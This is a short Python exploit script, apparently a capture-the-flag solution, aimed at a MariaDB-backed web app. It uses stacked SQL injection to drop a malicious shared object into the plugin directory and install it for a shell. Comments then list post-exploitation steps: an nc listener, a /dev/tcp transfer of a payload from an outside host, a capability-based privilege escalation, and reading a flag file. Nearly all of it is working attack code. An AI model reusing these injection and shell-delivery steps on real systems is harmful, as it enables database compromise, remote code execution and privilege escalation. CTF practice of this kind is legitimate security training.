import os
import requests

url = "http://localhost:8087/"

f = open("exp.so", 'rb')

#step 1, send so file
xid = "1; select unhex('" + ''.join(['%02X' % b for b in bytes(f.read())]) + "') into dumpfile '/mysql/plugin/lolita2.so';"
res = requests.post(url, data={
    "id": xid
})
print(res.text)

#step 2, create tables
xid = '''1;
CREATE DATABASE IF NOT EXISTS mysql;
use mysql;
CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment='MySQL plugins';


'''
res = requests.post(url, data={
    "id": xid
})
print(res.text)

#step 3, load so file
xid = "1; INSTALL PLUGIN plugin_name SONAME 'lolita2.so';"
res = requests.post(url, data={
    "id": xid
})
print(res.text)

#step 4, get shell, find cap and setcap

'''
nc -lvp 8666
    getcap -r /
    export MARIADB_PLUGIN_DIR=.
    dd < /dev/tcp/ip_address/8766 > cap.so #send cap.so to the server, server side: nc -lvp 8766 < cap.so ^C
    mariadb --plugin-dir=. --default-auth=cap
    cat /flag



'''